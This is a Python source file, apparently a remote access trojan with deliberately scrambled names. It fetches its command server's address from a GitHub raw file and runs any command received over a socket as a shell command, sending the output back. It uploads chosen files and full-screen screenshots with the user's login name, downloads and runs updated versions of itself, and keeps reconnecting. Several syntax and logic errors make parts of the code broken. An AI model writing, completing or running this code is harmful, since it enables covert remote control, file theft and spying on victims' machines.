import sys,subprocess,socket,time,requests
from PIL import ImageGrab
rZSVImA = "04.12.24.11"
xHUxKhowj = ""
DbjSTszpnrRoQx = ""
iCcpYhA = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
UfzjQgiCGkRVulJLzKGF = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
BVJIJLxkQCQPGdItKtvedbK = "!"
def XUfXokDLLyfjOGcR(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))
	return s
def NZUoYmICXAznAWKDkudqb(s):
	RpJFjtXdtNHkxAaHePXjx = s.recv(1024)
	if len(RpJFjtXdtNHkxAaHePXjx)==0:
		return True
	pPuTVqHH = RpJFjtXdtNHkxAaHePXjx.decode("utf-8")
	if not pPuTVqHH.startswith(BVJIJLxkQCQPGdItKtvedbK):
		proc = subprocess.run(pPuTVqHH, shell=True, capture_output=True)
		ABHoJJB = proc.stdout + proc.stderr
		s.send(ABHoJJB)
		return
	ViGHvDrackDSF = pPuTVqHH.split(" ")[0][1:]
	if ViGHvDrackDSF == "download":
		ustMSvRrOKFVKODaeBRu(s, pPuTVqHH)
	elif ViGHvDrackDSF == "screenshot":
		fIZYNgkbWTdErni(s)
def ustMSvRrOKFVKODaeBRu(s, pPuTVqHH):
	GKsANEIDaKbVb = pPuTVqHH.replace(BVJIJLxkQCQPGdItKtvedbK+"download ","").split(",")
	ABHoJJBs = []
	for f in GKsANEIDaKbVb:
		ABHoJJBs += EzCsBanhuG(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes("\n".join(ABHoJJBs), "utf-8"))
def fIZYNgkbWTdErni(pPuTVqHH):
	zVsPksMhN = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	zVsPksMhN.save(fpath)
	zVsPksMhN.close()
	r = EzCsBanhuG(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)
def EzCsBanhuG(QImJtKwHy, GUnxGIPrHRyzj, xqyRHLimzxhgUAY=None):
	if not os.path.exists(QImJtKwHy):
		return "[!] NOT FOUND: "+QImJtKwHy+"\n"
	headers = {"user":os.getlogin()}
	if xqyRHLimzxhgUAY is not None:
		headers = {**headers, **xqyRHLimzxhgUAY}
	requests.post(xHUxKhowj+":"+DbjSTszpnrRoQx+"/"+GUnxGIPrHRyzj,
		files={open(QImJtKwHy, "rb")},
		headers=headers)
	return "[+] SUCCESS: "+QImJtKwHy+"\n"
def orZzJpoikcgdOGAjU():
	if xHUxKhowj == "" or DbjSTszpnrRoQx == "":
		RpJFjtXdtNHkxAaHePXjx = requests.get(iCcpYhA).text.replace("\n","").split(":")
		xHUxKhowj = RpJFjtXdtNHkxAaHePXjx[0].strip()
		DbjSTszpnrRoQx = RpJFjtXdtNHkxAaHePXjx[1].strip()
		qIgvKYpqARzaJjK = RpJFjtXdtNHkxAaHePXjx[2].strip()
	return xHUxKhowj, DbjSTszpnrRoQx, qIgvKYpqARzaJjK
def SciGJRtNmVharKL():
	zAiMHOsvrUJrGYzotAcoY = os.path.basename(__file__)
	fileType = zAiMHOsvrUJrGYzotAcoY.split(".")[-1]
	FWCyYjigzACgHJrh = zAiMHOsvrUJrGYzotAcoY.replace(fileType,"") +"."+rZSVImA + fileType
	VTgOgWeYMLvcoDVXBYuG = os.path.join(os.path.getcwd(), FWCyYjigzACgHJrh)
	with open(FWCyYjigzACgHJrh, "wb+") as f:
		f.write(requests.get(UfzjQgiCGkRVulJLzKGF+"/file"+VTgOgWeYMLvcoDVXBYuG.split(".")[-1]))
	if fileType == ".exe":
		os.system(".\"+VTgOgWeYMLvcoDVXBYuG)
	elif fileType == ".pyw":
		os.system("python "+VTgOgWeYMLvcoDVXBYuG")
def BSyUONLfEkKGigqA():
	pass
def QCcXEmLHPwWOkemDbRp():
	h, p, v = orZzJpoikcgdOGAjU()
	if rZSVImA != v:
		SciGJRtNmVharKL()
	BSyUONLfEkKGigqA()
	IQUNAIlBZczD = bytes("["+rZSVImA+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				WsokKnLsrayLvgV=False
				try:
					s=XUfXokDLLyfjOGcR(h, p)
					while not WsokKnLsrayLvgV:
						s.send(IQUNAIlBZczD)
						WsokKnLsrayLvgV=NZUoYmICXAznAWKDkudqb(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(QCcXEmLHPwWOkemDbRp())
